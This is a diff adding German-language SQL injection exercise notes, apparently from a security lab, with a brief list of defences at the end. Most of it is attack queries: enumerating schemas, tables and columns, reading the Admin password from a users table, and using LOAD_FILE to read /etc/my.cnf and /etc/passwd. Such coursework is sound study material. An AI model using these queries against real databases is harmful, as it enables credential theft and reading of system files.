@@ -1,0 +1,63 @@
+##################
+# SQL Injections #
+##################
+
+#1 
+
+#Current DB Name
+
+SELECT DATABASE() as name FROM users
+
+#2
+
+#Name von Schemata n (0 indiziert)
+SELECT SCHEMA_NAME as name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT n,1
+
+
+#Anzahl der Schemata
+SELECT COUNT(SCHEMA_NAME) as name FROM INFORMATION_SCHEMA.SCHEMATA
+
+#3
+
+#Name der n Tabele in der Datenbank forum (0 indiziert)
+SELECT TABLE_NAME as name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='forum' LIMIT n,1
+
+#Anzahl der Tabelen in der Datenbank forum
+SELECT COUNT(TABLE_NAME) as name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='forum'
+
+#4
+
+# Der name des n-ten Feldes der users Tabelle der forum Datenbank (0 indiziert)
+SELECT column_name as name FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'forum' AND TABLE_NAME = 'users' LIMIT n,1
+
+#Anzahl der Felder in der users Tabelle der forum Datenbank
+SELECT COUNT(column_name) as name FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'forum' AND TABLE_NAME = 'users'
+
+#5
+
+#password feld von nutzer Admin
+SELECT password as name FROM users WHERE name='Admin'
+
+#6
+
+SELECT LOAD_FILE('/etc/my.cnf') as name
+
+#7
+we are root@localhost
+
+SELECT LOAD_FILE('/etc/passwd') as name
+
+
+#############################
+# SQL injections verhindern #
+#############################
+
+Escaping User input
+Prepared Statements 
+Reduced Permissions for SQL Server
+Reduced Permissions for SQL User
+
+
+
+
+
